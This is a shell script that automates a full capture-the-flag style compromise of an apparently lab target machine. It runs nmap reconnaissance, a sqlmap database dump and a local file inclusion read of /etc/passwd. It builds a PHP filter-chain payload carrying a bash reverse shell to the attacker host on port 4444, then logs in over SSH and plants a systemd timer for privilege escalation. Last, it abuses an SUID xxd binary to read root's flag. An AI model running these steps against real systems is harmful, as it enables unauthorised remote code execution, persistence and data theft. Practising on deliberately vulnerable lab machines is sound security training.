#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Parse arguments from flags
passphrase=""
while getopts p: flag
do
    case "${flag}" in
        p) passphrase=${OPTARG};;
    esac
done

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.226.231"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -sC -sV -sS -T4 -F ${target_ip} > $result_folder/nmap-results.txt

echo "2 - ATTACK WEB SERVER"
# Test for SQL injections
sqlmap -u "http://$target_ip/login.php" --data "username=&password=" --answers="follow=Y" --level=5 --risk=3 --batch --dump > $result_folder/sqlmap.txt
curl -s -X GET http://$target_ip/secret-script.php?file=/etc/passwd -o $result_folder/users.txt

# Exploit the use of filters
curl -s -X GET https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py -o $result_folder/php_filter_chain_generator.py
CHAIN="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"
CHAIN=$CHAIN$attack_ip
CHAIN="$CHAIN/4444 0>&1'\");?>"
python3 $result_folder/php_filter_chain_generator.py --chain "$CHAIN" > $result_folder/filter.txt
FILTER=$(cat $result_folder/filter.txt | tail -1)
php -r "echo file_get_contents('$FILTER');"
xterm -hold -e "nc -lvnp 4444" &
PID=$!
curl -s -X GET http://$target_ip/secret-script.php?file=$FILTER -o $result_folder/trash

# Once access is granted, copy your public ssh key into /home/comte/.ssh/authorized_keys to be given full access
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip "cat user.txt" > $result_folder/user.txt

# Launch the prepared exploit service to give xxd suid
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip "sudo -l" > $result_folder/sudo.txt
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip 'echo "[Unit]
Description=Trigger Exploit Service

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
Unit=exploit.service

[Install]
WantedBy=timers.target" > /etc/systemd/system/exploit.timer'  
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip "sudo /bin/systemctl restart exploit.timer"
sshpass -P assphrase -p $passphrase scp -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 $scriptpath/../../tools/LinEnum.sh comte@$target_ip:/home/comte/LinEnum.sh
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip "/home/comte/LinEnum.sh" > $result_folder/linenum.txt

# Exploit xxd
sshpass -P assphrase -p $passphrase ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 comte@$target_ip "/opt/xxd "/root/root.txt" | /opt/xxd -r" > $result_folder/root.txt